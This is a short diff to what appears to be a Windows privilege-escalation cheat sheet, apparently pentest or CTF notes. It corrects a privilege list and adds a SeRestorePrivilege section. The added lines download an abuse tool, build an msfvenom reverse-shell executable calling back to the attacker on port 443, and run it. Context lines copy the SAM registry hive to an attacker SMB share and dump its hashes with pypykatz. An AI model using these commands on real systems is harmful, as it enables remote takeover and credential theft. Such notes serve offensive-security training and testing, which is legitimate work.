@@ -130,10 +130,10 @@ python3 -m http.server 80
 ```
 
 Other privileges that can be exploited if enabled: 
-`SeBackupPrivilege` `SeAssignPrimaryToken` `SeLoadDriver` `SeDebugPrivilege` `SeBackupPrivilege`
+`SeBackupPrivilege` `SeAssignPrimaryToken` `SeLoadDriver` `SeDebugPrivilege` `SeRestorePrivilege`
 
  Abuse:
-#SEDebugPrivilege 
+#SeDebugPrivilege 
 
 ```bash
 impacket-smbserver -smb2support s .
@@ -149,6 +149,17 @@ cp sam //$LOCAL_IP/s/sam
 
 ```bash
 pypykatz registry --sam sam system
+```
+
+#SeRestorePrivilege
+
+```bash
+wget https://github.com/dxnboy/redteam/raw/master/SeRestoreAbuse.exe
+msfvenom -p windows/shell_reverse_tcp LHOST=tun0 LPORT=443 -f exe > shell.exe
+```
+
+```powershell
+./SeRestoreAbuse.exe 'cmd /c C:\tools\shell.exe'
 ```
 Generate Payload for DLL hijacking
 ---
